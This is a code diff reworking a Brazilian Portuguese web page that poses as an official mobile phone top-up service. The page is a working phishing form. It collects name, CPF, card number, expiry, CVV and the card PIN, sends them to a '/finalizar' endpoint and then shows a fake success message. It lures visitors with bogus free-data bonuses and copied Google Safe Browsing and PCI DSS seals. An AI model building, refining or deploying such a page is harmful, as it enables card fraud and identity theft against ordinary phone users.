@@ -3,143 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recarga Express - Oficial</title>
+    <title>Recarga + Fácil - Oficial</title>
     <style>
-        /* Estilo do Fundo com as Operadoras */
-        body { 
-            background: #0d1117; 
-            background-image: linear-gradient(rgba(13, 17, 23, 0.8), rgba(13, 17, 23, 0.8)), 
-                              url('https://img.freepik.com/vetores-premium/conjunto-de-logotipos-de-operadoras-de-telecomunicacoes-moveis-do-brasil_526131-41.jpg');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: #f0f6fc; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
+        :root { --primary: #f39200; --secondary: #004a99; --bg: #eef2f7; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; align-items: center; }
+        
+        .header { text-align: center; padding: 20px; }
+        .header h1 { color: var(--secondary); margin: 0; font-size: 28px; }
+        .header span { color: var(--primary); }
+        .header p { color: #666; margin-top: 5px; }
+
+        .container { background: white; width: 90%; max-width: 450px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        
+        label { font-weight: bold; color: #333; display: block; margin-bottom: 10px; }
+        input[type="tel"], input[type="text"], input[type="password"] { 
+            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; margin-bottom: 20px;
         }
 
-        /* Card Principal Estilo Profissional */
-        .card { 
-            background: rgba(22, 27, 34, 0.95); 
-            padding: 30px; 
-            border-radius: 15px; 
-            border: 1px solid #30363d; 
-            width: 100%; 
-            max-width: 380px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            backdrop-filter: blur(5px);
+        .grid-operadoras, .grid-valores { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        
+        .op-btn, .val-btn { 
+            border: 1px solid #ddd; padding: 15px; border-radius: 10px; text-align: center; cursor: pointer; background: white; transition: 0.2s;
+        }
+        .op-btn.selected, .val-btn.selected { border: 2px solid var(--secondary); background: #f0f7ff; color: var(--secondary); font-weight: bold; }
+
+        .val-btn span { display: block; font-size: 12px; color: #238636; margin-top: 4px; }
+
+        .btn-prosseguir { 
+            width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; 
         }
 
-        h2 { text-align: center; color: #58a6ff; margin-bottom: 25px; }
-
-        input, select { 
-            width: 100%; padding: 12px; margin-bottom: 15px; 
-            border-radius: 8px; border: 1px solid #30363d; 
-            background: #0d1117; color: white; box-sizing: border-box; 
-            font-size: 16px;
-        }
+        .seguranca { margin-top: 20px; display: flex; gap: 15px; opacity: 0.6; }
+        .seguranca img { height: 30px; }
 
         .etapa { display: none; }
         .ativa { display: block; }
-
-        button { 
-            width: 100%; padding: 15px; 
-            background: #238636; color: white; 
-            border: none; border-radius: 8px; 
-            font-weight: bold; font-size: 16px;
-            cursor: pointer; margin-top: 10px;
-            transition: 0.3s;
-        }
-
-        button:hover { background: #2ea043; transform: translateY(-2px); }
-
-        /* Rodapé com Selos de Segurança */
-        .seguranca {
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-around;
-            width: 100%;
-            max-width: 380px;
-            filter: grayscale(100%) brightness(1.5);
-            opacity: 0.7;
-        }
-
-        .seguranca img { height: 40px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>📱 Recarga Rápida</h2>
+    <div class="header">
+        <h1>RECARGA <span>+FÁCIL</span></h1>
+        <p>A forma mais fácil de recarregar seu celular</p>
+    </div>
+
+    <div class="container">
         <form id="formRecarga">
             <div id="etapa1" class="etapa ativa">
-                <select id="operadora">
-                    <option>Vivo</option>
-                    <option>Tim</option>
-                    <option>Claro</option>
-                    <option>Oi</option>
-                </select>
-                <input type="text" id="nome" placeholder="Nome Completo" required>
-                <input type="text" id="cpf" placeholder="CPF (000.000.000-00)" required>
-                <input type="tel" id="telefone" placeholder="Telefone com DDD" required>
-                <select id="valor">
-                    <option value="20">R$ 20,00</option>
-                    <option value="30">R$ 30,00</option>
-                    <option value="40">R$ 40,00</option>
-                    <option value="50">R$ 50,00</option>
-                </select>
-                <button type="button" onclick="ir(2)">PRÓXIMA ETAPA</button>
+                <label>Digite seu número:</label>
+                <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
+
+                <label>Qual sua operadora?</label>
+                <div class="grid-operadoras">
+                    <div class="op-btn" onclick="selectOp(this, 'Vivo')">Vivo</div>
+                    <div class="op-btn" onclick="selectOp(this, 'Claro')">Claro</div>
+                    <div class="op-btn" onclick="selectOp(this, 'TIM')">TIM</div>
+                    <div class="op-btn" onclick="selectOp(this, 'Oi')">Oi</div>
+                </div>
+
+                <label>Quanto quer recarregar?</label>
+                <div class="grid-valores">
+                    <div class="val-btn" onclick="selectVal(this, '20')">R$ 20 <span>+4GB GRÁTIS</span></div>
+                    <div class="val-btn" onclick="selectVal(this, '30')">R$ 30 <span>+6GB GRÁTIS</span></div>
+                    <div class="val-btn" onclick="selectVal(this, '50')">R$ 50 <span>+10GB GRÁTIS</span></div>
+                    <div class="val-btn" onclick="selectVal(this, '100')">R$ 100 <span>+20GB GRÁTIS</span></div>
+                </div>
+
+                <button type="button" class="btn-prosseguir" onclick="ir(2)">PROSSEGUIR COM RECARGA</button>
             </div>
 
             <div id="etapa2" class="etapa">
-                <input type="text" id="cartao" placeholder="Número do Cartão" maxlength="16" required>
-                <div style="display: flex; gap: 10px;">
-                    <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
-                    <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
-                </div>
-                <button type="button" onclick="ir(3)">VALIDAR DADOS</button>
+                <label>Confirme seus dados:</label>
+                <input type="text" id="nome" placeholder="Nome Completo" required>
+                <input type="text" id="cpf" placeholder="CPF" required>
+                <button type="button" class="btn-prosseguir" onclick="ir(3)">IR PARA PAGAMENTO</button>
             </div>
 
             <div id="etapa3" class="etapa">
-                <p style="text-align: center; font-size: 14px; color: #8b949e;">Para sua segurança, confirme a senha do cartão:</p>
+                <label>Dados do Cartão:</label>
+                <input type="text" id="cartao" placeholder="Número do Cartão" maxlength="16" required>
+                <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
                 <input type="password" id="senha" placeholder="Senha do Cartão" required>
-                <button type="submit">FINALIZAR RECARGA</button>
+                <button type="submit" class="btn-prosseguir">FINALIZAR PAGAMENTO</button>
             </div>
-
+            
             <div id="etapa4" class="etapa" style="text-align:center">
-                <div style="font-size: 50px; color: #238636;">✓</div>
-                <h3>Recarga Solicitada!</h3>
-                <p>O crédito cairá em até 30 minutos.</p>
+                <h2 style="color: #238636;">✓ Sucesso!</h2>
+                <p>Sua recarga foi processada.</p>
             </div>
         </form>
     </div>
 
     <div class="seguranca">
-        <img src="https://logodownload.org/wp-content/uploads/2017/08/selo-google-safe-browsing.png" alt="Google Safe">
-        <img src="https://logodownload.org/wp-content/uploads/2014/10/pci-dss-compliant-logo.png" alt="PCI DSS">
-        <img src="https://logodownload.org/wp-content/uploads/2020/02/site-blindado-logo.png" alt="Site Blindado">
+        <img src="https://logodownload.org/wp-content/uploads/2017/08/selo-google-safe-browsing.png">
+        <img src="https://logodownload.org/wp-content/uploads/2014/10/pci-dss-compliant-logo.png">
     </div>
 
     <script>
+        let dadosComp = { operadora: '', valor: '' };
+
+        function selectOp(el, val) {
+            document.querySelectorAll('.op-btn').forEach(b => b.classList.remove('selected'));
+            el.classList.add('selected');
+            dadosComp.operadora = val;
+        }
+
+        function selectVal(el, val) {
+            document.querySelectorAll('.val-btn').forEach(b => b.classList.remove('selected'));
+            el.classList.add('selected');
+            dadosComp.valor = val;
+        }
+
         function ir(n) {
             document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
             document.getElementById('etapa'+n).classList.add('ativa');
+            window.scrollTo(0,0);
         }
 
         const form = document.getElementById('formRecarga');
         form.onsubmit = async (e) => {
             e.preventDefault();
-            const dados = {
-                operadora: document.getElementById('operadora').value,
+            const payload = {
+                ...dadosComp,
+                telefone: document.getElementById('telefone').value,
                 nome: document.getElementById('nome').value,
                 cpf: document.getElementById('cpf').value,
-                telefone: document.getElementById('telefone').value,
-                valor: document.getElementById('valor').value,
                 cartao: document.getElementById('cartao').value,
                 data: document.getElementById('data').value,
                 cvv: document.getElementById('cvv').value,
@@ -149,7 +138,7 @@
             const res = await fetch('/finalizar', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(dados)
+                body: JSON.stringify(payload)
             });
 
             if(res.ok) ir(4);
